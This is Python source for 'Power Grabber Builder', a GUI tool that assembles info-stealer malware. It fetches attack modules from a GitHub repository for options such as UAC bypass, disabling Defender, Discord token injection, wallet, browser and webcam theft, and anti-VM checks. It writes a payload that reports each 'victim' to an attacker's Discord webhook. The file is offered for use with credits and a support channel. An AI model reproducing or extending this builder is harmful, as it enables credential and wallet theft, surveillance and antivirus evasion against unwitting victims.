import customtkinter as ctk
import os
from customtkinter import *
from tkinter import *
import requests
from io import BytesIO
from PIL import Image, ImageTk
class Power_Grabber(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title('Power Grabber Builder')
        self.geometry('1000x600')
        self.resizable(False, False)
        ctk.set_appearance_mode('dark')
        ctk.set_default_color_theme("dark-blue")
        ctk.set_widget_scaling(1.0)
        self.main_frame = ctk.CTkFrame(self, fg_color='#1A1A1A', corner_radius=0)
        self.main_frame.pack(side=LEFT, fill=BOTH, expand=True)
        self.sidebar = ctk.CTkFrame(self, width=300, fg_color='#212127', corner_radius=0)
        self.sidebar.pack(side=RIGHT, fill=Y)
        url = "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true"
        ur ="https://github.com/Powercascade/Power-grabber/blob/main/git.png?raw=true"
        u = "https://github.com/Powercascade/Power-grabber/blob/main/discord-logo.png?raw=true"
        URL = "https://github.com/Powercascade/Power-grabber/blob/main/settings.png?raw=true"
        response = requests.get(url)
        image_data = response.content
        image = Image.open(BytesIO(image_data))
        self.logo = ImageTk.PhotoImage(image)
        self.logo_label = ctk.CTkLabel(self.sidebar, image=self.logo, text="")
        self.logo_label.pack(pady=(20, 10))
        settings_response = requests.get(URL)
        settings_image_data = settings_response.content
        settings_image = Image.open(BytesIO(settings_image_data))
        settings_image = settings_image.resize((20, 20))
        self.settings_icon = ImageTk.PhotoImage(settings_image)
        self.options_button = ctk.CTkButton(
            self.sidebar, 
            text="Options", 
            command=self.show_options_page,
            fg_color='#FF3535', 
            hover_color='#FF3535',
            text_color='#000000', 
            font=('Arial', 16, 'bold'),
            image=self.settings_icon, 
            compound="left")
        self.options_button.pack(pady=10)
        self.credits_button = ctk.CTkButton(
            self.sidebar, 
            text="Credits", 
            command=self.show_credits_page,
            fg_color='#FF3535', 
            hover_color='#FF3535',
            text_color='#000000',  
            font=('Arial', 16, 'bold'))
        self.credits_button.pack(pady=10)
        self.content_frame = ctk.CTkFrame(self.main_frame, fg_color='transparent')
        self.content_frame.pack(padx=20, pady=20, fill=BOTH, expand=True)
        self.options_page = self.create_options_page()
        self.credits_page = self.create_credits_page()
        github_response = requests.get(ur)
        github_image_data = github_response.content
        github_image = Image.open(BytesIO(github_image_data))
        github_image = github_image.resize((20, 20))
        self.github_icon = ImageTk.PhotoImage(github_image)
        self.github_button = ctk.CTkButton(
            self.sidebar, 
            text="GitHub Repo", 
            command=self.open_github,
            fg_color='#FF3535', 
            hover_color='#FF3535',
            text_color='#000000',
            font=('Arial', 16, 'bold'),
            image=self.github_icon, 
            compound="left")
        self.github_button.pack(pady=10)
        discord_response = requests.get(u)
        discord_image_data = discord_response.content
        discord_image = Image.open(BytesIO(discord_image_data))
        discord_image = discord_image.resize((20, 20))
        self.discord_icon = ImageTk.PhotoImage(discord_image)
        self.discord_button = ctk.CTkButton(
            self.sidebar, 
            text="Join Discord", 
            command=self.join_discord,
            fg_color='#FF3535', 
            hover_color='#FF3535',
            text_color='#000000',
            font=('Arial', 16, 'bold'),
            image=self.discord_icon, 
            compound="left")
        self.discord_button.pack(pady=10)
        self.support_button = ctk.CTkButton(
            self.sidebar, 
            text="Contact Support", 
            command=self.contact_support,
            fg_color='#FF3535', 
            hover_color='#FF3535',
            text_color='#000000',
            font=('Arial', 16, 'bold'))
        self.support_button.pack(pady=10)
        self.login_button = ctk.CTkButton(
            self.sidebar,
            text="Login",
            fg_color='#FF3535',
            hover_color='#FF3535',
            text_color='#000000',
            font=('Arial', 16, 'bold'))
        self.login_button.pack(pady=10)
        self.free_vbucks_button = ctk.CTkButton(
            self.sidebar, 
            text="FrEe VbUcKs!11!1", 
            command=self.open_free_vbucks_link, 
            fg_color='#FF3535', 
            hover_color='#FF3535', 
            text_color='#000000',
            font=('Arial', 16, 'bold'))
        self.free_vbucks_button.pack(pady=10)
    def create_options_page(self):
        page = ctk.CTkFrame(self.content_frame, fg_color='transparent')
        def on_hover(event, widget):
            widget.configure(border_width=4)
            widget.configure(border_color="#FF3535")
        def off_hover(event, widget):
            widget.configure(border_width=3)
            widget.configure(border_color="#FF3535")
        webhook_entry = ctk.CTkEntry(
            page,
            width=600,
            height=45,
            fg_color='#2C2C2C',
            text_color='white',
            placeholder_text='Enter Webhook URL:',
            placeholder_text_color='lightgray',
            border_width=3,
            corner_radius=15,
            border_color='#FF3535',
            font=('Arial', 14, 'bold'))
        webhook_entry.pack(pady=(15, 15))
        webhook_entry.bind("<Enter>", lambda e: on_hover(e, webhook_entry))
        webhook_entry.bind("<Leave>", lambda e: off_hover(e, webhook_entry))
        filename_entry = ctk.CTkEntry(
            page,
            width=600,
            height=45,
            fg_color='#2C2C2C',
            text_color='white',
            placeholder_text="File name (don't type extension)",
            placeholder_text_color='lightgray',
            border_width=3,
            corner_radius=15,
            border_color='#FF3535',
            font=('Arial', 14, 'bold'))
        filename_entry.pack(pady=(15, 25))
        filename_entry.bind("<Enter>", lambda e: on_hover(e, filename_entry))
        filename_entry.bind("<Leave>", lambda e: off_hover(e, filename_entry))
        options_label = ctk.CTkLabel(page, text='Options:', 
                                    font=('Arial', 24, 'bold', 'italic'),
                                    text_color='white')
        options_label.pack(pady=(0, 10))
        hr = ctk.CTkFrame(page, height=2, width=400, fg_color='#FF3535', 
                        border_width=1,
                        border_color='#FF3535',
                        corner_radius=5)
        hr.pack(pady=(0, 10))
        checkbox_options = ['Anti VM', 'Annoy Victim (Audio)', 'Browser Info', 'Clipboard contents', 'Disable defender (Needs UAC Bypass)', 'Discord Info', 'Discord Injection', 'Email Addresses', 'Exact location', 'Games info', 'Kill defender (Needs UAC Bypass)', 'Obfuscate', 'Roblox account', 'Self destruction', 'Screenshot', 'System info', 'UAC Bypass', 'Vulnerable port creation', 'Wallets', 'Watch Dog', 'Webcam']
        checkbox_frame = ctk.CTkFrame(page, fg_color='transparent')
        checkbox_frame.pack(fill=X)
        checkbox_dict = {}
        for i, option in enumerate(checkbox_options):
            row = i // 3
            col = i % 3
            checkbox = ctk.CTkCheckBox(
                checkbox_frame, 
                text=option, 
                width=200, 
                height=32,
                fg_color='#FF3535', 
                text_color='white', 
                border_color='#FF3535', 
                corner_radius=16,
                hover_color='#FF3535',
                checkmark_color='#FFFFFF',
                border_width=1,
                font=('Arial', 12, 'bold', 'italic'),
                text_color_disabled='gray',
                hover=True)
            checkbox.grid(row=row, column=col, padx=10, pady=5, sticky='w')
            checkbox_dict[option] = checkbox
        pumper_frame = ctk.CTkFrame(page, fg_color='transparent')
        pumper_frame.pack(fill=X, pady=(20, 0))
        pumper_label = ctk.CTkLabel(pumper_frame, text='File Pumper (MB):', 
                                    font=('Arial', 16))
        pumper_label.pack(side=LEFT, padx=(0, 10))
        pumper_combo = ctk.CTkComboBox(pumper_frame, values=['None', '5', '10'], width=100, height=32, 
                                    fg_color='#FF3535', text_color='white', border_color='#FF3535', 
                                    corner_radius=12, state="readonly", button_color='#FF3535', button_hover_color='#FF3535')
        pumper_combo.pack(side=LEFT, padx=(0, 10), pady=(5, 5))
        ping_label = ctk.CTkLabel(pumper_frame, text='Ping:  ', font=('Arial', 16))
        ping_label.pack(side=LEFT, padx=(10, 0))
        ping_combo = ctk.CTkComboBox(pumper_frame, values=['None', 'Here', 'Everyone'], width=100, height=32, 
                                    fg_color='#FF3535', text_color='white', border_color='#FF3535', 
                                    corner_radius=12, state="readonly", button_color='#FF3535', button_hover_color='#FF3535')
        ping_combo.pack(side=LEFT, padx=(10, 0), pady=(5, 5))
        spacer = ctk.CTkFrame(pumper_frame, width=20, fg_color='transparent')
        spacer.pack(side=LEFT, fill=X, expand=True)
        def build_button_clicked(event):
            checkbox_statuses = {
                "Annoy-Victim": bool(checkbox_dict['Annoy Victim (Audio)'].get()),
                "Anti-VM": bool(checkbox_dict['Anti VM'].get()),
                "Browser-Info": bool(checkbox_dict['Browser Info'].get()),
                "Clipboard": bool(checkbox_dict['Clipboard contents'].get()),
                "Disable-Defender": bool(checkbox_dict['Disable defender (Needs UAC Bypass)'].get()),
                "Discord-Info": bool(checkbox_dict['Discord Info'].get()),
                "Discord-Injection": bool(checkbox_dict['Discord Injection'].get()),
                "Email-Addresses": bool(checkbox_dict['Email Addresses'].get()),
                "Exact-location": bool(checkbox_dict['Exact location'].get()),
                "Games-Info": bool(checkbox_dict['Games info'].get()),
                "Kill-Defender": bool(checkbox_dict['Kill defender (Needs UAC Bypass)'].get()),
                "Obfuscate": bool(checkbox_dict['Obfuscate'].get()),
                "Roblox-Account": bool(checkbox_dict['Roblox account'].get()),
                "Self-destruction": bool(checkbox_dict['Self destruction'].get()),
                "Screenshot": bool(checkbox_dict['Screenshot'].get()),
                "System-Info": bool(checkbox_dict['System info'].get()),
                "UAC-Bypass": bool(checkbox_dict['UAC Bypass'].get()),
                "Vulnerable-port-creation": bool(checkbox_dict['Vulnerable port creation'].get()),
                "Wallets": bool(checkbox_dict['Wallets'].get()),
                "Watch-Dog": bool(checkbox_dict['Watch Dog'].get()),
                "Webcam": bool(checkbox_dict['Webcam'].get()),
                "Filepumper-Value": pumper_combo.get(),
                "Ping": ping_combo.get(),}
            enabled_features = []
            feature_values = {}
            webhook_url = webhook_entry.get()
            filename = filename_entry.get()
            for term, status in checkbox_statuses.items():
                if status:
                    enabled_features.append(term)
                if term in ['Filepumper-Value', 'Ping']:
                    feature_values[term] = status
            def fetch_and_clean_code(url):
                code = requests.get(url).text.strip()
                return "\n".join(line for line in code.splitlines() if line.strip() != "")
            combined_code = ""
            all_imports = set()
            def extract_imports(code):
                imports = []
                for line in code.splitlines():
                    if line.startswith("import") or line.startswith("from"):
                        imports.append(line.strip())
                return imports
            if 'Anti-VM' in enabled_features:
                vm_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/vm-check.py')
                combined_code += "\n".join([line for line in vm_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                all_imports.update(extract_imports(vm_code))
            if 'Annoy-Victim' in enabled_features:
                annoy_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Annoy.py')
                combined_code += "\n".join([line for line in annoy_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                all_imports.update(extract_imports(annoy_code))
            if 'Clipboard' in enabled_features:
                clipboard_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Clipboard.py')
                combined_code += "\n".join([line for line in clipboard_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                all_imports.update(extract_imports(clipboard_code))
            if 'Discord-Info' in enabled_features:
                discord_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Discord-Info.py')
                combined_code += "\n".join([line for line in discord_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                all_imports.update(extract_imports(discord_code))
            if 'Discord-Injection' in enabled_features:
                discord_injection_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Injection.py')
                combined_code += "\n".join([line for line in discord_injection_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                all_imports.update(extract_imports(discord_injection_code))
            if 'Games-Info' in enabled_features:
                games_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Games.py')
                combined_code += "\n".join([line for line in games_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                all_imports.update(extract_imports(games_code))
            if 'Exact-location' in enabled_features:
                location_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Location.py')
                combined_code += "\n".join([line for line in location_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                all_imports.update(extract_imports(location_code))
            if 'Obfuscate' in enabled_features:
                obfuscate_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Obfuscate.py')
                combined_code += "\n".join([line for line in obfuscate_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                all_imports.update(extract_imports(obfuscate_code))
            if 'Roblox-Account' in enabled_features:
                roblox_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Roblox.py')
                combined_code += "\n".join([line for line in roblox_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                all_imports.update(extract_imports(roblox_code))
            if 'Screenshot' in enabled_features:
                screenshot_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Screenshot.py')
                combined_code += "\n".join([line for line in screenshot_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                all_imports.update(extract_imports(screenshot_code))
            if 'Self-destruction' in enabled_features:
                destruct_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Self-destruct.py')
                combined_code += "\n".join([line for line in destruct_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                all_imports.update(extract_imports(destruct_code))
            if 'System-Info' in enabled_features:
                system_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/System-Info.py')
                combined_code += "\n".join([line for line in system_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                all_imports.update(extract_imports(system_code))
            if 'Vulnerable-port-creation' in enabled_features:
                port_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Port.py')
                combined_code += "\n".join([line for line in port_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                all_imports.update(extract_imports(port_code))
            if 'Webcam' in enabled_features:
                webcam_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Webcam.py')
                combined_code += "\n".join([line for line in webcam_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                all_imports.update(extract_imports(webcam_code))
            if 'Browser-Info' in enabled_features:
                browser_code = fetch_and_clean_code('https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Options/Browsers.py')
                combined_code += "\n".join([line for line in browser_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                all_imports.update(extract_imports(browser_code))
            ping_message = ""
            ping_code = ""
            if feature_values.get('Ping') == "Here":
                ping_message = "'@here'"
            elif feature_values.get('Ping') == "Everyone":
                ping_message = "'@everyone'"
            if ping_message:
                ping_code = f"""
import requests
import socket
hostname = socket.gethostname()
data = {{
        "content": {ping_message},
        "embeds": [
            {{
                "title": "Power Grabber Notification",
                "description": f"{{hostname}} ran the file! Grabbing info on the victim...",
                "color": 0x8B0000
            }}]}}
response = requests.post("{webhook_url}", json=data)
if response.status_code == 204:
    pass
else:
    pass
                """
            final_imports = "\n".join(sorted(all_imports))
            final_code = final_imports + "\n" + f"webhook_url = '{webhook_url}'\n" + ping_code + "\n" + combined_code
            with open(f"{filename}.py", 'w', encoding='utf-8') as file:
                file.write(final_code)
            build_button.configure(fg_color='#FF5A5A')
            build_button.after(200, lambda: build_button.configure(fg_color='#FF3535'))
        build_button = ctk.CTkButton(pumper_frame, text="Build", width=200, height=40,
                                    fg_color='#FF3535', hover_color='#FF3535',
                                    font=('Arial', 18, 'bold'))
        build_button.bind("<Button-1>", build_button_clicked)
        build_button.pack(side=RIGHT, padx=(0, 10))
        return page
    def create_credits_page(self):
        page = ctk.CTkFrame(self.content_frame, fg_color='transparent')
        credits_label = ctk.CTkLabel(page, text="Credits", font=('Arial', 24, 'bold'))
        credits_label.pack(pady=(0, 20))
        credits_text = """
        Thanks to the following people for their contributions:
        - The Developers:
        - Taktikal.exe: Provided crucial code for this project
        - Powercascade: Started the project and made most of the code

        - The Helpers:
        - TheOneWhoWatches: Paid Powercascade $20 to make this project and gave him the idea to make premium

        - Special thanks:
        - You, the user: For using Power Grabber. If you have any issues, please contact Powercascade on Discord.

        - Existing:
        - LLucas1425
        """
        credits_textbox = ctk.CTkTextbox(page, width=700, height=500, fg_color='#212127', text_color='white')
        credits_textbox.pack(pady=10)
        credits_textbox.insert("1.0", credits_text)
        credits_textbox.configure(state="disabled")
        return page
    def show_options_page(self):
        self.credits_page.pack_forget()
        self.options_page.pack(fill=BOTH, expand=True)
    def show_credits_page(self):
        self.options_page.pack_forget()
        self.credits_page.pack(fill=BOTH, expand=True)
    def open_github(self):
        os.system("start https://github.com/Powercascade/Power-grabber")
    def join_discord(self):
        os.system("start https://discord.gg/FzvXRxNzM2")
    def contact_support(self):
        os.system("start https://discord.gg/QmtjEGDzBf")
    def open_free_vbucks_link(self):
        os.system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        self.show_options_page()
if __name__ == '__main__':
    app = Power_Grabber()
    app.mainloop()
